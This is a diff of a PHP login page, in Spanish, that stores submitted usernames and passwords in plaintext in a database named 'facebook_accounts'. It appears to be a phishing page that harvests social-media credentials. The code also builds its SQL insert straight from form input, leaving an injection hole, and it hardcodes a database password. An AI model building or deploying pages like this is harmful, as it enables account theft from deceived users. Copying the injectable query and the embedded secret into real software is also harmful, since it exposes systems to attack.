@@ -1,17 +1,11 @@
 <?php
-
     $servidor = "localhost";
     $usuario = "id21738922_root";
     $clave = "";
     $baseDeDatos = "id21738922_facebook_accounts";
 
-    $enlace = mysqli_connect ('localhost','id21738922_root','Al2229+2229$',"id21738922_facebook_accounts");
-    
+    $conectar = mysqli_connect ('localhost','id21738922_root','Al2229+2229$',"id21738922_facebook_accounts");
 ?>    
-
-
-
-
 
 <!DOCTYPE html>
 <html lang="en">
@@ -121,10 +115,9 @@
         <input type="password" id="password" name="password" placeholder="contraseña" required>
       </div><br>
       <div class="form-group">
-     <button type="submit" name="login" >Iniciar Sesión</button></form>
+     <button type="submit" name="login">Iniciar Sesión</button>
      <br><br>
      <a href="https://www.ejemplo.com">¿Olvidaste tu contraseña?</a><br><br>
-     
      <hr> <button type="submit" name="login" class="button" style="background-color: #4CAF50;" >Crear cuenta</button><br><br>
       </div>
     </form>
@@ -133,14 +126,6 @@
 </body>
 </html>
 
-
-
-
-
-
-
-
-
 <?php
     if(isset($_POST['login'])){
        
@@ -148,14 +133,8 @@
     $password= $_POST ['password'];
         
     $insertarDatos = "INSERT INTO log_in VALUES('$username','$password','0')";
-    $ejecutarInsertar = mysqli_query ($enlace, $insertarDatos);
+    $ejecutarInsertar = mysqli_query ($conectar, $insertarDatos);
     
    }
-    
-?> 
-
-
-
-
-
-
+?>
+ 
